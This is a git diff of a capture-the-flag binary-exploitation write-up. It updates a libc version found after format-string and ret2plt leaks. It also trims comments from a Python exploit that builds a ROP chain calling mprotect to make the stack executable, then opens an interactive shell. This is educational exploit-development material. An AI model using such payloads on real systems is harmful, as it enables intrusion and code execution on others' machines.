@@ -464,7 +464,7 @@ euan@euanb26  binary  python3 fuzz.py
 %2$p : 0xf7f2e5c0 - _IO_2_1_stdin_
 ```
 And if we also try a ret2plt to read some addresses, we find that puts is located at `0xf7f3db40`
-Let's put it into [libc blukht](https://libc.blukat.me/) and we get that the libc version is `libc6_2.27-3ubuntu1_i386`, great! We've now defeated ASLR.
+Let's put it into [libc blukhat](https://libc.blukat.me/) and we get that the libc version is ` libc6_2.31-0ubuntu9.1_i386`, great! We've now defeated ASLR and know the libc version!
 
 Lets create our exploit:
 ```python
@@ -528,11 +528,9 @@ payload += p32(stack_leak + input_buffer_offset) # return address for mprotect
 payload += p32(stack_end & -0x1000) # addr for the mprotect to make executable. Need to have a page-aligned value
 payload += p32(0x1000) # length for mprotect to change permission
 payload += p32(7) # permission to be set
-# Sending the payload
+
 p.sendline(payload)
-# Receving the printf line with lot of spaces for clean output
 p.recv()
-# Getting the shell
 p.interactive()
 p.close()
 ```
